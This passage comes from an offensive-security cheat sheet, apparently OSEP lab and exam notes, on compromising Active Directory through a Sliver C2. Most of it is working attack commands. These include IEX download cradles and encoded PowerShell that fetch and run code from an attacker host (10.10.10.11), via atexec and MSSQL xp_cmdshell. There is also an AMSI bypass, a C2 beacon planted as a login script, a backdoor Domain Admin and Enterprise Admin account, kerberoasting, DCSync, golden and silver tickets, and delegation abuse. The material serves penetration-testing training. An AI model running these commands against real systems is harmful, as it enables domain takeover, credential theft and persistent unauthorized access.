sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine03.domain.com"'


# Base64 encode and run
Get-DomainComputer | select dnshostname
sharpsh -i -t 20 -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -e -c R2V0LURvbWFpbkNvbXB1dGVyIHwgc2VsZWN0IGRuc2hvc3RuYW1l
```



### Laps

```powershell
# SharpLaps with C# support - Without target specified, we get creds for all machines fetched from DC
sharplaps /host:DC06
sharplaps /host:DC06 /target:machine04
sharplaps /host:DC06 /target:client


# If you have rights to read passwords, you can use powerview's get-computer for getting the secrets as well
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine04.domain.com"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine02.domain.com"'


# SharpView can be used as well
sharpview -- 'Get-DomainComputer -Identity machine03.domain.com -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
sharpview -- 'Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
```


### SharpHound

> Using legacy sharphound/bloodhound is recommended for OSEP challenges/exam as the latest one can't fetch all edges - Do run both specially in exam

```powershell
# Go within the world writable directory for ease
cd C:/Windows/tasks


# Run with all checks and grab details of any trusts between forests
execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v2.5.13.exe -C all --searchforest


# Specify a different forest/domain with which we have trust
execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v2.5.13.exe -d domain.com -C all --searchforest


# Run old version of Sharphound if the latest one does not get many edges - Use GPOLocalGroup as All would not use it
execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v1.1.1.exe -C all --searchforest
execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v1.1.1.exe -C All,GPOLocalGroup --searchforest


# PowerShell Legacy - https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'
```

#### Linux

```powershell
# CE
bloodhound-ce-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u machine05\$ --zip


# Legacy
bloodhound-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u user --zip
```


### PingCastle

Download the free version from PingCastle's site - Its in C# so we can run this easily using exec-assem

```powershell
# Go within the world writable directory for ease
cd C:/Windows/tasks


# Run the pingcastle tool
execute-assembly -t 200 /home/kali/tools/bins/PingCastle_3.3.0.1/PingCastle.exe --healthcheck --explore-trust --explore-forest-trust --level Full --no-enum-limit --skip-null-session
```



### ADPeas

The light version does not contain bloodhound within, suggested to use that.

```powershell
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/adPEAS.ps1 -c "Invoke-adPEAS"'
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/adPEAS-Light.ps1 -c "Invoke-adPEAS"'


# Load when in a shell
IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/adPEAS-Light.ps1'))
IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/adPEAS.ps1'))


# Run
Invoke-adPEAS
```




### Trusts

#### PowerView

```powershell
# Get the domain/forest trusts
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -NET"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -API"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain dev.domain.com"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain hr.domain.com"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain domain.com"'


# Get domain trusts mapping (between each other)
sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrustMapping"'


# Get foreign members from part of current domain from another forest (run for all forests with which we have trust)
sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain dev.domain.com"'
sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain hr.domain.com"'
sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain domain.com"'


# Check which users/groups are part of localgroups on machines based on GPO policies
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainGPOUserLocalGroupMapping"'


# Get forest groups accessible to our forest with SID >= 1000 - For SID filtering (base64 encode on cyberchef)
Get-DomainGroup -LDAPFilter "(objectSID>=S-1-5-21-201072640-2662162558-1369012345-1000)" -Domain domain.com | select cn,memberof,objectSID
sharpsh -i -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c R2V0LURvbWFpbkdyb3VwIC1MREFQRmlsdGVyICIob2JqZWN0U0lEPj1TLTEtNS0yMS0yMDEwNzI2NDAtMjY2MjE2MjU1OC0xMzY5MDEyMzQ1LTEwMDApIiAtRG9tYWluIGRvbWFpbi5jb20gfCBzZWxlY3QgY24sbWVtYmVyb2Ysb2JqZWN0U0lE
```


#### ADSearch

```powershell
# List down all users - we get the trust user as well -> CORP1$
execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(objectCategory=user)"


# List down the trusts, its way and the trusting/trusted domain
execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(objectCategory=trustedDomain)" --domain domain.com --attributes distinguishedName,name,flatName,trustDirection
```



### Shares Enumeration

> Takes a lot of time, if lots of share - Better to run within `shell`

```powershell
execute-assembly -t 200 /home/kali/tools/bins/csharp-files/SharpShares.exe /ldap:all
```


## Domain Exploitation

### Persistence

> Run as NT\Auth or Admin on the DC

Creates a new domain user and adds it into DA and EA groups

```powershell
execute -o net user userooo2 "User123123@" /add /Y /domain
execute -o net localgroup administrators userooo2 /add /Y /domain
execute -o net group "domain admins" userooo2 /add /domain
execute -o net group "enterprise admins" userooo2 /add /domain
execute -o net user userooo2 /domain
```

### Kerberoasting 

```powershell
# Within current domain
rubeus -- kerberoast /simple /nowrap


# For a specific domain we have trust with
rubeus -- kerberoast /simple /domain:domain.com /nowrap
```


Crack the hashes

```powershell
hashcat -m 13100 -a 0 kerb.hashes /usr/share/wordlists/rockyou.txt -w 3 -O
```


### ACLs Abuse 

#### ForcePasswordChange on User

```powershell
# Use Powerview, we'll base64 encode the below - Password for nina will be Password123!
Set-DomainUserPassword -Identity user -AccountPassword $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c U2V0LURvbWFpblVzZXJQYXNzd29yZCAtSWRlbnRpdHkgdXNlciAtQWNjb3VudFBhc3N3b3JkICQoQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlKQ==


# Check if shaun's password has been changed
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainUser -Identity user | select pwdlastset"'
```


#### GenericWrite on User

Two things can be done
- Add SPN and Kerberoast
- Change login script (check login frequency of the user)


Set SPN and perform kerberoasting

```powershell
# Check all properties of user
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainUser user | select lastlogon"'


# Set SPN to pwned/service on user
Set-DomainObject -Identity user -SET @{serviceprincipalname='pwned/service'}
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c U2V0LURvbWFpbk9iamVjdCAtSWRlbnRpdHkgdXNlciAtU0VUIEB7c2VydmljZXByaW5jaXBhbG5hbWU9J3B3bmVkL3NlcnZpY2UnfQ==


# Get hash for the user based on set SPN
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSPNTicket -SPN pwned/service -OutputFormat Hashcat | fl"'


# Try and crack hashes using hashcat
hashcat -m 13100 -a 0 user.hash /usr/share/wordlists/rockyou.txt -w 3 -O
```


Change login script

```powershell
# This needs to be an executable or can be a .bat file containing powershell oneliner
generate beacon --http 10.10.10.11:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion


# Setup share
impacket-smbserver -smb2support myshare .


# Set the scriptpath attribute to .exe file
Set-DomainObject -Identity user -SET @{scriptpath='\\10.10.10.11\myshare\sliver.obfuscated.exe'}
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c U2V0LURvbWFpbk9iamVjdCAtSWRlbnRpdHkgdXNlciAtU0VUIEB7c2NyaXB0cGF0aD0nXFwxMC4xMC4xMC4xMVxteXNoYXJlXHNsaXZlci5vYmZ1c2NhdGVkLmV4ZSd9
```


#### WriteDacl on Group

> The user attacker can writedacl on admins group and add users within it
##### Windows Abuse

```powershell
# Load script
shell
powershell -ep bypass
IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/PowerView.ps1'))


# WriteMembers does not work for some reason, use All instead
Add-DomainObjectAcl -TargetIdentity admins -PrincipalIdentity attacker -Rights WriteMembers
Add-DomainObjectAcl -TargetIdentity admins -PrincipalIdentity attacker -Rights All
sharpsh -t 20 -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -e -c QWRkLURvbWFpbk9iamVjdEFjbCAtVGFyZ2V0SWRlbnRpdHkgYWRtaW5zIC1QcmluY2lwYWxJZGVudGl0eSBhdHRhY2tlciAtUmlnaHRzIEFsbA==


# Add the user into admins
Add-DomainGroupMember -Identity 'admins' -Members 'attacker'
sharpsh -t 20 -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -e -c QWRkLURvbWFpbkdyb3VwTWVtYmVyIC1JZGVudGl0eSAnYWRtaW5zJyAtTWVtYmVycyAnYXR0YWNrZXIn


# Check the group members if user is now part of it
Get-DomainGroupMember -Identity admins
sharpsh -t 20 -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -e -c R2V0LURvbWFpbkdyb3VwTWVtYmVyIC1JZGVudGl0eSBhZG1pbnM=
```


##### Linux Abuse

```powershell
# Add ACL for write permissions on the group admins for attacker
proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'attacker' -target 'admins' 'domain.com'/'attacker' -hashes ':12345678912345678912345678912345'


# Use PTH NET to add the user account into attacker 
proxychains pth-net rpc group addmem "admins" "attacker" -U "domain.com"/"attacker"%"ffffffffffffffffffffffffffffffff":"12345678912345678912345678912345" -S "dc02.domain.com"


# Verify if the user account has been added
proxychains pth-net rpc group members "admins" -U "domain.com"/"attacker"%"ffffffffffffffffffffffffffffffff":"12345678912345678912345678912345" -S "dc02.domain.com"
```


### Unconstrained Delegation

Based on a machine having unconstrained delegation rights. 

```powershell
# Find out computers/users with Unconstrained Delegation
sharpsh -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -c '"Get-DomainComputer -UnConstrained"'
sharpsh -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -c '"Get-DomainUser -UnConstrained"'


# Now open two sliver sessions, both should be as the machine account itself (perform `getsystem` if working as a local admin)
rubeus -t 30 -- monitor /interval:5 /runfor:15 /filteruser:DC06$ /nowrap
rubeus -t 30 -- monitor /interval:5 /runfor:15 /nowrap


# Open another sliver session and use the session to run SpoolSample/SharpSpoolTrigger to coerce - SharpSpoolTrigger is preferred
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/SpoolSample.exe DC06 machine06
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/SharpSpoolTrigger.exe DC06 machine06


# Confirm current tickets
execute -o klist


# We should now have the TGT, inject into current process or launch new one with cmds in shell duplication
rubeus -i -- ptt /ticket:doIFDDCCBQigAwIBBaEDAgEWooIEFD...


# Check if new ticket is injected
execute -o klist
```


### Constrained Delegation

#### Machine

```powershell
# Check machines for constrained delegation
sharpsh -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -c '"Get-DomainComputer -TrustedToAuth"'


# Get CIFS ticket and inject in current session
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /nowrap /ptt


# OR Create a new process with Rubeus - Requires admin access to create and inject ticket within it
rubeus -i -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE7TCCBOlhggTlMIIE4aADAgEFoQobCEVWSUwuQ09No


# Migrate into the created process
migrate -p 4192


# Get the current tickets
execute -o klist


# Do altservice for the host, http/host/cifs
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:host /nowrap /ptt
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:http /nowrap /ptt
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:cifs /nowrap /ptt


# Check tickets again
execute -o klist


# We can now access C$ on the host
ls //machine03.domain.com/c$
```

#### User

```powershell
sharpsh -- -u 'http://10.10.10.11/powershell-scripts/PowerView.ps1' -c '"Get-DomainUser -TrustedToAuth"'


# Convert password into NTLM
rubeus -t 20 -- hash /password:password123


# Get CIFS ticket and inject in current session
rubeus -t 20 -- s4u /user:user /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /nowrap /ptt


# Get the current tickets
execute -o klist


# Do altservice for the host
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:host /nowrap /ptt
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:http /nowrap /ptt
rubeus -t 20 -- s4u /user:machine02$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:"cifs/machine03.domain.com" /altservice:cifs /nowrap /ptt


# Check tickets again
execute -o klist


# We can now access C$ on the host
ls //machine03.domain.com/c$
```

#### Linux

```powershell
# Get Ticket for machine03
impacket-getST -spn cifs/machine03 -impersonate administrator 'domain.com/user:password'


# Declare as var
export KRB5CCNAME=administrator@cifs_machine03.domain.com.ccache
klist


# Don't use full FQDN or it causes SMB errors
impacket-psexec -no-pass -k domain.com/administrator@machine03 -target-ip 10.10.100.16


# Or use impacket-atexec which should get the sliver session directly
impacket-atexec -k -no-pass domain.com/administrator@machine03 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
```



### RBCD

#### GenericWrite

```powershell
# Find machine quota if we can create new computer objects
Get-DomainObject -Properties ms-DS-MachineAccountQuota
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c R2V0LURvbWFpbk9iamVjdCAtUHJvcGVydGllcyBtcy1EUy1NYWNoaW5lQWNjb3VudFF1b3Rh



# Load PowerMad tool to create new computer object
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4xxxx2' -AsPlainText -Force)
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/Powermad.ps1 -e -c TmV3LU1hY2hpbmVBY2NvdW50IC1NYWNoaW5lQWNjb3VudCBteUNvbXB1dGVyIC1QYXNzd29yZCAkKENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ2g0eHh4eDInIC1Bc1BsYWluVGV4dCAtRm9yY2Up


# Check if the computer object is created
Get-DomainComputer -Identity myComputer
sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c R2V0LURvbWFpbkNvbXB1dGVyIC1JZGVudGl0eSBteUNvbXB1dGVy


# AMSI Bypass for interactive shell within sliver (in case sharpsh won't work)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


# Loading PowerView in powershell (in case sharpsh won't work)
iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/PowerView.ps1'))


# Get the binary length of the computer - As our user has GenericWrite on the machine08, we can update its attributes
# Printing $ExecutionContext.SessionState.LanguageMode just in case to see output if it worked
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0); Get-DomainComputer -Identity machine08.domain.com | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}; $ExecutionContext.SessionState.LanguageMode
sharpsh -i -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c JHNpZCA9IEdldC1Eb21haW5Db21wdXRlciAtSWRlbnRpdHkgbXlDb21wdXRlciAtUHJvcGVydGllcyBvYmplY3RzaWQgfCBTZWxlY3QgLUV4cGFuZCBvYmplY3RzaWQ7ICRTRCA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAiTzpCQUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlNEUkNXRFdPOzs7JCgkc2lkKSkiOyAkU0RieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICgkU0QuQmluYXJ5TGVuZ3RoKTsgJFNELkdldEJpbmFyeUZvcm0oJFNEYnl0ZXMsMCk7IEdldC1Eb21haW5Db21wdXRlciAtSWRlbnRpdHkgbWFjaGluZTA4LmRvbWFpbi5jb20gfCBTZXQtRG9tYWluT2JqZWN0IC1TZXQgQHsnbXNkcy1hbGxvd2VkdG9hY3RvbmJlaGFsZm9mb3RoZXJpZGVudGl0eSc9JFNEQnl0ZXN9OyAkRXhlY3V0aW9uQ29udGV4dC5TZXNzaW9uU3RhdGUuTGFuZ3VhZ2VNb2Rl



# Verify the changes we did - is the msds-allowedtoactonbehalfofotheridentity now present? 
$RBCDbytes = Get-DomainComputer machine08.domain.com -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0; $Descriptor.DiscretionaryAcl
sharpsh -i -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c JFJCQ0RieXRlcyA9IEdldC1Eb21haW5Db21wdXRlciBtYWNoaW5lMDguZG9tYWluLmNvbSAtUHJvcGVydGllcyAnbXNkcy1hbGxvd2VkdG9hY3RvbmJlaGFsZm9mb3RoZXJpZGVudGl0eScgfCBzZWxlY3QgLWV4cGFuZCBtc2RzLWFsbG93ZWR0b2FjdG9uYmVoYWxmb2ZvdGhlcmlkZW50aXR5OyAkRGVzY3JpcHRvciA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkUkJDRGJ5dGVzLCAwOyAkRGVzY3JpcHRvci5EaXNjcmV0aW9uYXJ5QWNs



# Generate NTLM hash of the password
rubeus -t 20 -- hash /password:h4xxxx2


# Create the ticket and inject in current session
rubeus -t 20 -- s4u /user:myComputer$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:CIFS/machine08.domain.com /nowrap
rubeus -t 20 -- s4u /user:myComputer$ /rc4:ffffffffffffffffffffffffffffffff /impersonateuser:administrator /msdsspn:CIFS/machine08.domain.com /nowrap /ptt



# OR Create a new process with Rubeus - Requires admin access to add ticket within it
rubeus -i -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:doIGIjCCBh6gAwIBBaEDAgEWooIFJzCCBSNhggUfMIIFG6ADAgEFoRAbDk9QU


# Migrate into the created process
migrate -p 3116


# Get the current tickets
execute -o klist


# Check the details of appsrv01
ls //machine08.domain.com/c$


# Run psexec now on appsrv01 and get shell access
psexec -d Title -s Description -p osep-lateral machine08.domain.com
```





## Silver Ticket

> Impersonating a user from a domain group which has access to a web service 

### Windows


```powershell
# Get TGT and see if we can reach the child domain
.\Rubeus.exe hash /password:password123
.\Rubeus.exe asktgt /domain:domain.com /user:username /rc4:ffffffffffffffffffffffffffffffff /nowrap /ptt


# Generate silver ticket impersonating victim user from prod domain for http service on machine05
.\Rubeus.exe silver /service:HTTP/machine05.domain.com /rc4:ffffffffffffffffffffffffffffffff /user:victim /domain:domain.com /nowrap /ptt /ldap


# In sliver
rubeus -t 30 -- silver /service:HTTP/machine05.domain.com /rc4:ffffffffffffffffffffffffffffffff /user:victim /domain:domain.com /nowrap /ldap /ptt



# Open internet explorer, go into intranet settings and add the domain machine05.domain.com into trusted sites after opening
&"C:\Program Files\internet explorer\iexplore.exe"


# Open the following urls, we're now victim
http://machine05.domain.com/Internal/
http://machine05.domain.com/Internal/Admin



# To try on Browser, convert the base64 contents we got into .ccache format
echo "doIF5TCCBeGgAwIBBaEDAgDUxMjNaqBMbEURFTktJQUlSLVBST0QuQ09NqS...." | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
klist


# Open firefox
firefox


# Set configs
about:config


# Set the following settings
network.negotiate-auth.trusted-uris = .domain.com
network.negotiate-auth.delegation-uris = .domain.com


# Reopen firefox and we should be able to access the Admin portal
firefox --new-tab http://machine05.domain.com/Internal/Admin


# Within linux, this works
curl -k http://machine05.domain.com --negotiate -u :
curl -k http://machine05.domain.com/Internal --negotiate -u :
curl -k http://machine05.domain.com/Internal/Admin --negotiate -u :
```


### Linux 

```powershell
# Get victim's ticket
impacket-ticketer -nthash ffffffffffffffffffffffffffffffff -domain-sid S-1-5-21-3313635286-3087330321-3553712345 -domain domain.com -spn HTTP/machine05.domain.com victim


# Check ticket status
klist


# We can now impersonate victim
curl -k --negotiate -u : http://machine05.domain.com/Internal
curl -k --negotiate -u : http://machine05.domain.com/Internal/Admin
```






## Domain Lateral Movement

### Password Change

> This runs on the DC to change password of a domain user as DA

```powershell
execute -o net user domainuser "Password123!" /domain
```

### Golden Ticket

#### Child Domain to Parent Domain

Creating golden ticket to be a part of EA within the parent domain from the child domain

```powershell
# Get krbtgt token from the child domain using DCSync
krbtgt -> ffffffffffffffffffffffffffffffff


# Try to access CIFS on DC02
ls //dc02.domain.com/c$


# Check the tickets
execute -o klist


# Get the SIDs for the forest domain and its child
Get-DomainSID -Domain child.domain.com
Get-DomainSid -Domain domain.com
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain child.domain.com"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain domain.com"'


# We get
S-1-5-21-2032401531-514583578-4118012345
S-1-5-21-1135011135-3178090508-3151412345


# Draft golden ticket - user can be anything bogus - sid is current domain SID and SIDs is child's - Also -519 is the EA group identifier and is static
rubeus -t 30 -- golden /rc4:ffffffffffffffffffffffffffffffff /sid:S-1-5-21-2032401531-514583578-4118012345 /sids:S-1-5-21-1135011135-3178090508-3151412345-519 /ldap /user:Administrator /domain:child.domain.com /nowrap /ptt


# Check the tickets
execute -o klist


# Try accessing the C$ now
ls //dc02.domain.com/c$


# Go into client -> nt auth\system shell and then
psexec -d Title -s Description -p osep-lateral dc02.domain.com
```

#### Parent Domain to Child Domain

> All this or just add yourself into EA by being a DA on the parent domain

```powershell
# DCSync to do SharpKatz - Only the DA -> Admin can do it hence we do runas above
execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --User domain.com\\krbtgt --Domain domain.com --DomainController dc01.domain.com


# Hashes
krbtgt -> ffffffffffffffffffffffffffffffff


# Get the SIDs for the domain
Get-DomainSID -Domain domain.com
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain domain.com"'


# We get
domain.com -> S-1-5-21-1725955968-4040474791-670212345


# Draft golden ticket - user can be anything bogus - sid and sids are same with sids containing group id for EA
rubeus -t 30 -- golden /rc4:ffffffffffffffffffffffffffffffff /sid:S-1-5-21-1725955968-4040474791-670212345 /sids:S-1-5-21-1725955968-4040474791-670212345-519 /ldap /user:Administrator /domain:domain.com /nowrap /ptt


# Check the tickets
execute -o klist


# Try accessing the C$ now
ls //dc02.dev.domain.com/c$


# Go into client -> nt auth\system shell and then
psexec -d Title -s Description -p osep-lateral dc02.dev.domain.com
```



## MSSQL

### SQLMap

```powershell
# Automate injection on post/get request stored within a .txt file
sqlmap -r sqli.txt --batch


# Enumerate dbs
sqlmap -r sqli.txt --batch --dbs


# OS Shell
sqlmap -u "http://10.10.200.100/?src=*&dst=" --os-shell --batch


# Relaying through SQLmap
sqlmap -u "http://10.10.200.100/?src=*&dst=" --batch --sql-query="EXEC master.dbo.xp_dirtree '\\\\10.10.10.11\\share'"


# NetNTLMv2 - responder hash crack
hashcat -m 5600 db01.hash /usr/share/wordlists/rockyou.txt --force
```

### Queries

```powershell
# Check if we can impersonate SA
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sa');
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; 


# Impersonate SA and enable xp_cmdshell and get sliver shell
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# One liner
EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
```

### MSSQLand

> This is recommended for everything - labs/exam - @n3rada is really active, drop him a message for any bugs


```powershell
# Local Authentication on different SQL servers
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql02 /action:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql03 /action:whoami


# Token authentication (current user)
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql04 /a:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:localhost /a:whoami


# Check what user can be impersonated on current instance
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01 /a:impersonate


# List down the chained links
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:linkmap


# Linkmap to check links (really useful)
SQL01 (localuser [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
SQL01 (localuser [dbo]) ---> SQL03 (localAccount [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])


# Impersonate user across link
